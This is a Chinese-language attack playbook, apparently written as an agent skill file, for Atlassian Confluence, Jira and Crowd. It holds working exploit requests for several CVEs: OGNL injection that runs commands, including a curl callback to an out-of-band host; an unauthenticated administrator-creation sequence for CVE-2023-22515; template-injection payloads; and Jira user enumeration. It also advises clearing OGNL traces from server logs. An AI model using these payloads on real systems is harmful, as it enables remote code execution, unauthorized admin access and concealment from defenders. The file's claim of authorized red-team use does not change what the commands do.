---
name: confluence-atlassian
description: Atlassian 产品（Confluence / Jira / Bitbucket / Crowd）攻击面与利用。OGNL 模板注入 RCE、安装向导授权绕过、SSTI、Widget Connector 路径穿越、应用链 SSRF、SAML 信任链。授权红队与内网中间件审计使用。
tags: [confluence, jira, atlassian, ognl, ssti, middleware, redteam, intranet]
---

# Atlassian 产品攻击面

**判定纪律**：Confluence 的 CVE 版本区间极窄且被厂商改过多次（22515 初期公告写 8.0.0-8.5.2，后修正为 8.0.0-8.5.3，再补 8.5.4 修复不全）。**必须用 banner 反查真实版本**，不要凭 CVE 公告的区间下结论。`/login.action` 页脚的 build 号比任何公告都准。

## 一、指纹与版本定位

```bash
# 主版本（页面标题 + 静态资源路径）
curl -sk https://TARGET/login.action | grep -oE 'ajs-version-number[^>]*content="[^"]*"' 
curl -sk https://TARGET/login.action | grep -oE 'build-[0-9]+'

# 更可靠的 build 号（页脚 / 静态 JS）
curl -sk https://TARGET/s/d41d8cd98f00b204e9800998ecf8427e-CDN/... | head
curl -sk https://TARGET/about.action | grep -oE '[0-9]+\.[0-9]+\.[0-9]+'

# Jira
curl -sk https://TARGET/rest/api/2/serverInfo | jq '.version,.buildNumber'

# Crowd
curl -sk https://TARGET/crowd/console/ | grep -oE 'version[^<]*'

# 判定：401 / 302 → login.action 说明 Confluence 活着
# 404 全站但 /s/ 静态资源 200 → 静态站点伪装，不是 Confluence
```

| 产品 | 关键路径 | 未授权可读 |
|---|---|---|
| Confluence | `/login.action` `/setup/setupadministrator.action` | ✅ |
| Jira | `/rest/api/2/serverInfo` `/secure/Dashboard.jspa` | 部分 |
| Bitbucket | `/rest/api/1.0/application-properties` | ✅ |
| Crowd | `/crowd/console/` `/crowd/rest/usermanagement/1/` | 部分 |

## 二、CVE 矩阵（附判定条件）

| CVE | 类型 | 影响版本 | 前置条件 | 实测判据 |
|---|---|---|---|---|
| **CVE-2022-26134** | OGNL 注入 RCE | Confluence Server/DC **全版本**（7.4.17/7.13.7/7.14.3/7.15.2/7.16.4/7.17.4/7.18.1 修复） | 无需认证 | URI 里带 OGNL，响应头回显命令输出 |
| **CVE-2023-22527** | 模板注入 RCE | DC/Server **8.0.x – 8.5.3** | 无需认证 | POST `/template/aui/text-inline.vm` |
| **CVE-2023-22515** | 授权绕过 | DC/Server **8.0.0 – 8.5.3**（8.5.4 起完整修复） | 无需认证 | `/setup/setupadministrator.action` 返回 200 而非 302 |
| **CVE-2023-22518** | 授权绕过（数据丢失） | DC **7.19.x / 8.3.x–8.8.x** | 无需认证 | `/json/setup-restore.action` 可达 |
| **CVE-2021-26084** | OGNL 注入 RCE | Server/DC **< 7.4.10 / 7.13.0 之前 7.11.6 / 7.12.6** | 无需认证 | `/pages/doenterpagevariables.action` |
| **CVE-2019-3396** | Widget Connector 路径穿越 + SSTI | **< 6.6.12 / 6.7–6.14.2 / 6.15.1** | 需登录（任意低权） | `/rest/tinymce/1/macro/preview` |
| **CVE-2019-3395** | SSRF | 同上区间 | 需登录 | Widget 预览指向内网 |

### CVE-2022-26134 OGNL 载荷（最常用）

```bash
# 判定是否可打：先做无副作用探测（DNS 外带）
curl -sk "https://TARGET/%24%7B%28%23a%3D%40org.apache.log4j.Category.getInstance%28%22x%22%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22curl%20OAST_DOMAIN%22%29%29%7D/" 

# OAST 收到回连 = 成立。再走回显
curl -sk "https://TARGET/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29%29%29%7D/"

# 注意：命令要 URL 编码，单引号用 %27，空格用 %20
```

**坑**：Confluence 7.x 之后 OGNL 沙箱加了 `OgnlContext` 白名单，`@Runtime@exec` 在很多补丁版本不可达。**判定成立必须以回显或 OAST 为准，不能以「URL 没 500」为准**——大量版本返回 200 但表达式根本没执行。

### CVE-2023-22515 判定与非破坏利用

```bash
# 1) 探测：返回 200 + 页面含 "Setup Administrator" = 可打
curl -sk -o /dev/null -w '%{http_code}\n' https://TARGET/setup/setupadministrator.action

# 2) 创建管理员（写操作，先确认授权范围）
curl -sk -X POST https://TARGET/setup/setupadministrator.action \
  -H 'X-Atlassian-Token: no-check' \
  -d 'username=rt_admin&fullName=rt&email=rt@OAST_DOMAIN&password=Passw0rd!&confirm=Passw0rd!'

# 3) 若 2 失败（部分版本要先进 setup 状态）
curl -sk -X POST https://TARGET/server-info.action \
  -d 'bootstrapStatusProvider.applicationConfig.setupComplete=false'

# 4) 最后必须复原：setSetupComplete=false 会让门户进入安装态
curl -sk -X POST https://TARGET/server-info.action \
  -d 'bootstrapStatusProvider.applicationConfig.setupComplete=true'
```

⚠️ 第 4 步不是可选项。**22515 的典型事故是红队打完没复原，客户站点进了安装向导**。这条写进报告里比利用本身更重要。

### CVE-2023-22527 模板注入

```bash
curl -sk -X POST 'https://TARGET/template/aui/text-inline.vm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'label=@1' \
  --data-urlencode 'x=aaa' \
  --data-urlencode 'query=#set($x="")'  # 实际载荷需按版本调，先做 OAST 探测
```

**坑**：22527 的公开 PoC 有多个版本，8.5.0 与 8.5.3 的 `query` 参数处理不同。**先 OAST，再回显**，不要直接上 RCE 载荷。

## 三、低权到管理员（不依赖 RCE）

拿到任意账号后，Confluence 的提权面主要在三处：

| 面 | 手法 | 前置 |
|---|---|---|
| 空间权限 | 空间管理员可改空间权限 → 把自己拉进更高权空间 | 任一空间管理员 |
| 应用链接 SSRF | `/plugins/servlet/applinks/listApplicationLinks` 添加 URL → 服务端请求 | 需登录 |
| **CVE-2019-3396** | Widget 预览 SSTI → RCE | 需登录 |
| Confluence → Jira SSO | Application Link 共享 OAuth 消费者 → 越权 | 管理员 |

## 四、Jira 侧

```bash
# 用户名枚举（公开注册关闭时）
curl -sk 'https://TARGET/rest/api/2/user/picker?query=a' 

# CVE-2019-11581 模板注入（需 SMTP 配置 + 未授权访问 contact admin）
curl -sk 'https://TARGET/secure/ContactAdministrators!default.jspa' -d 'from=x&subject=x&details=$i18n.getClass()'

# 项目 key 枚举（低权即可）
curl -sk 'https://TARGET/rest/api/2/project'
```

## 五、常见误判

| 现象 | 误解 | 实际 |
|---|---|---|
| `/setup/setupadministrator.action` 302 | 不可打 | 可能只是 `setupComplete=true`，可先改 server-info 再试 |
| OGNL 返回 200 | 打成功 | 大量补丁版本吞异常返回 200，**必须回显/OAST 双证** |
| 版本号 8.5.4 | 22515 已修 | 8.5.4 只修了部分路径，官方要求升到 8.5.5+ 才算完整 |
| `/rest/api/2/serverInfo` 401 | 不是 Jira | 可能是 Jira 但开了匿名限制，看 `X-Seraph-LoginReason` 头 |
| 打了 22515 后站点白屏 | 打坏了 | 大概率没复原 `setupComplete`，先改回 true |

## 六、收尾检查

1. 22515/22518 是否复原了 `setupComplete` / 是否恢复了备份
2. 创建的管理员账号是否删除（`/admin/users.do`）
3. 应用链接 / Webhook 是否残留
4. 日志里是否留下 OGNL 特征（`${` `%24%7B`）——按需清理
